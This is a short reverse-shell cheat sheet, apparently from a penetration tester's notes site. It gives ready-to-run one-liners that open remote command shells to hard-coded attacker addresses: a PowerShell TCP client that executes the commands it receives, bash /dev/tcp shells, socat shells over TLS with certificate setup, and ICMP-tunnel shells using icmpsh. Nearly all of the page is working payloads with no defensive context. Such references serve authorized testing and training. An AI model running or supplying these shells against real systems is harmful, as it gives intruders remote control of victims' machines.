---
layout: page
title: "# Reverse Shells"
permalink: /shells/reverse_shells/
---

# Reverse Shells

## Powershell:

```powershell
#Oneliner:
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Bash:

```python
bash -i >& /dev/tcp/192.168.119.191/8888 0>&1

#OR:

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
```

## SoCat:

```bash
#Reverse Secure:

#Victim:
$socat - OPENSSL:192.168.73.144:8888,verify=0

#Attacker:
$socat -d -d OPENSSL-LISTEN:8888,cert=/opt/Certificates/shell.pem,verify=0 STDOUT

#Creating Certificate:
$openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 364 -out shell.crt

$cat shell.key shell.crt > shell.pem
```

## ICMP (Windows) based shells:

```bash
#Download ICMPSH:
https://github.com/bdamele/icmpsh
#Examples:
https://www.cynet.com/attack-techniques-hands-on/how-hackers-use-icmp-tunneling-to-own-your-network/
#Attacker:
#Before running icmpsh, we will need to prevent the kernel from replying to ICMP echo requests. Most ICMP tunneling tools will implement mechanisms to synchronize the data stream between the two machines, and the kernel replies may cause unexpected results.
#Add to: /etc/sysctl.conf
net.ipv4.icmp_echo_ignore_all=1
#Reload the settings:
sudo sysctl --system
#Run Server
#sudo ./icmpsh_m.py %ATTACKERIP% %VICTIMIP% <- The Victim IP waits for ICMP Requests from the server
sudo ./icmpsh_m.py 192.168.178.178 192.168.178.100
#Run Client (Windows:
icmpsh.exe -t 192.168.178.178
#A reverse shell is made and RCE is possible. Note - this traffic is NOT encrypted!

ICMPTunnel:
https://github.com/DhavalKapil/icmptunnel

PTunnelNG:
https://github.com/lnslbrty/ptunnel-ng

```

## Other Resources:

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#bash-tcp](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)
- [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
